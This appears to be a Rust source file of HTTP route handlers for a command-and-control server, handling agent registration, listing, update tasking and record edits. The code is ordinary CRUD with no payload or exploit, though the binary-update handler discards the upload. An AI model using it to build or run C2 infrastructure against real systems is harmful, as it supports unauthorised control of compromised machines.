use axum::{body::Bytes, extract::{Path, State}, http::StatusCode, response::IntoResponse, Json};
use common::model;
use tracing::{error, warn};

use crate::{routes::AGENT_NOT_FOUND, services, C2State};

pub async fn create(
    State(c2_state): State<C2State>,
    Json(agent): Json<model::Agent>,
) -> impl IntoResponse {
    if let Ok(agent) = services::agents::create(
        c2_state.conn.clone(),
        &agent.name,
        agent.identity,
        agent.platform,
    ) {
        (StatusCode::CREATED, Json(agent)).into_response()
    } else {
        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
    }
}

pub async fn get(State(c2_state): State<C2State>) -> impl IntoResponse {
    if let Ok(agents) = services::agents::get(c2_state.conn.clone()) {
        (StatusCode::OK, Json(agents)).into_response()
    } else {
        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
    }
}

// #[axum::debug_handler]
pub async fn update_bin(
    State(c2_state): State<C2State>,
    Path(agent_id): Path<i32>,
    _bin: Bytes,
) -> impl IntoResponse {
    match services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
        Ok(Some(_)) => {}
        Ok(None) => {
            warn!("Agent not found");
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };
    if let Err(e) =
        services::missions::create(c2_state.conn.clone(), agent_id, model::Task::Update(vec![]))
    {
        error!("{e}");
        return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
    }
    (StatusCode::OK).into_response()
}

pub async fn update(
    State(c2_state): State<C2State>,
    Path(agent_id): Path<i32>,
    agent_json: String,
) -> impl IntoResponse {
    let agent_json: serde_json::Value = serde_json::from_str(&agent_json).unwrap();
    match services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
        Ok(Some(agent)) => {
            match services::agents::update_by_id(c2_state.conn.clone(), &agent.merge(agent_json)) {
                Ok(agent) => (StatusCode::OK, Json(Some(agent))).into_response(),
                Err(e) => {
                    error!("{e}");
                    (StatusCode::INTERNAL_SERVER_ERROR).into_response()
                }
            }
        }
        Ok(None) => (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response(),
        Err(e) => {
            error!("{e}");
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }
}
